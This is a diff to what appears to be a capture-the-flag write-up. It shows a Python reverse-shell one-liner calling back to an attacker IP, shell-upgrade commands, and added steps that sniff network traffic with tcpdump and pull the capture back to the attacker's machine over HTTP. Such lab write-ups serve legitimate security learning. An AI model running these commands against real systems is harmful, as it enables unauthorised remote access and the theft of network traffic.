@@ -151,7 +151,7 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.8.153.120",999
 ```
 ![image](https://user-images.githubusercontent.com/5285547/126407229-c24fc6c5-30d3-43ff-b245-d8f76db7e69d.png)
 
-Upgrade your term
+Upgrade your terminal
 
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -160,6 +160,25 @@ reset
 xterm
 
 export TERM=xterm;export SHELL=bash
+```
+
+## Root
+
+Running linpeas on the box didn't show much, apart from tcpdump was usable. 
+
+![image](https://user-images.githubusercontent.com/5285547/126408059-0e4b8b9e-4342-49b4-8ca7-31bc86b2a069.png)
+
+So I started to sniff the traffie to see what was going on
+
+```
+tcpdump -i eth0 -A > tcpdump.out
+```
+
+Then transfered it to my box after a while to go thought the results. 
+
+```
+python3 -m http.server 8899
+wget http://IP/8899/tcpdump.out .
 ```
 
 
